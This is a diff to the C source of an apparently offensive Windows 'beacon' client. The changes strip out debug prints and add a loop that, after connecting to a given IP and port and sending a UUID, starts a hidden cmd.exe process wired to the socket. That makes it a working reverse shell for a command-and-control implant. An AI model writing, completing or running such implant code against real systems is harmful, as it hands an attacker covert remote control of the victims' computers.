@@ -7,6 +7,8 @@
 #include <wincrypt.h>
 #include <stdbool.h>
 #include <time.h>
+#include <process.h>
+
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "rpcrt4.lib")
@@ -47,8 +49,6 @@ char* gen_uuid() {
     //needs end byte
     buf[36] = '\0';
 
-    printf("\n BUF: %s \n", buf);
-
     return buf;
 }
 
@@ -64,47 +64,24 @@ void beacon_connect_to_server(char IP[16], int PORT){
 
     // INIT SOCKET = AF_INET (IPv4), SOCK_STREAM (Stream), IPPROTO_TCP (TCP)
     SOCKET s =  WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); 
-    //printf("\n%d", s);
+
     // IP+PORT SPEC
     int iResult;
     int jResult;
-    //printf("\n\n\nasasasasasa");
     struct sockaddr_in clientService;
     clientService.sin_family = AF_INET;
     clientService.sin_addr.s_addr = inet_addr(IP);
     clientService.sin_port = htons(PORT);
-    //printf("asasasasasa");
 
     // Connect to server.
     iResult = connect(s, (struct sockaddr*) &clientService, sizeof (clientService));
-    //printf("%d", iResult);
 
-
-    // Generate and send beacon metadata     
-    //// Generate UUID
+    // Generate and send beacon metadata  
     int recvbuflen = 4098;
-    //UUID uuid;
-    //UuidCreate(&uuid);
-    //char stringified_UUID[128];
-    ///UuidToString(&uuid, (RPC_CSTR*) stringified_UUID);
-    //char *sendbuf = stringified_UUID;
     char *sendbuf = gen_uuid();
-    //printf("\nBonkers: %s\n", sendbuf);
     char recvbuf[recvbuflen];
 
-    // base64 encode the UUID of the beacon
-    //char b64size[8];
-    //DWORD strcount;
-    //char *UUID_BUFFER;
-    //BOOL res = CryptBinaryToStringA(sendbuf, 8, 1, UUID_BUFFER, &strcount);
-    //printf("\nBASE64\n");
-    
-    //printf("\n%s\n", &uuid);
 
-    //// Send metadata
-    //printf("\nSENDBUF\n");
-    //printf("\n%s\n", &UUID_BUFFER);
-    //printf("\nSENDBUF2\n");
     send_all(s, sendbuf, (int)strlen(sendbuf)); 
   
     
@@ -112,7 +89,17 @@ void beacon_connect_to_server(char IP[16], int PORT){
     // Receive until the peer closes the connection
     do {
         iResult = recv(s, recvbuf, recvbuflen, 0);
-        //printf("\nWAAROM JIJ SLUITEN\n");
+
+        // Executing commands
+        STARTUPINFO sinfo;
+	    memset(&sinfo, 0, sizeof(sinfo));
+        sinfo.cb = sizeof(sinfo);
+        sinfo.dwFlags = (STARTF_USESTDHANDLES);
+        sinfo.hStdInput = (HANDLE)s;
+        sinfo.hStdOutput = (HANDLE)s;
+        sinfo.hStdError = (HANDLE)s;
+        PROCESS_INFORMATION pinfo;
+        CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
     } while( iResult >= 0 );
     
     
